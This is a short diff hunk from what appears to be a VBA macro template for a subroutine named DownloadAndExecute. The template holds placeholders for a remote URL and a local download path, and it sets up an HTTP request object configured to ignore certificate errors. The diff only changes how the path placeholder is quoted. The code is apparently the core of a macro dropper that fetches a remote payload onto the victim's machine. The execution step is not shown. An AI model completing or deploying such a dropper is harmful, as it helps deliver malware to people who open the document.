@@ -26,7 +26,7 @@ Private Sub DownloadAndExecute()
     Dim result As Integer
     
     myURL = "<<<URL>>>"
-    downloadPath = "<<<DOWNLOAD_PATH>>>"
+    downloadPath = <<<DOWNLOAD_PATH>>>
     
     Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     WinHttpReq.setOption(2) = 13056 ' Ignore cert errors
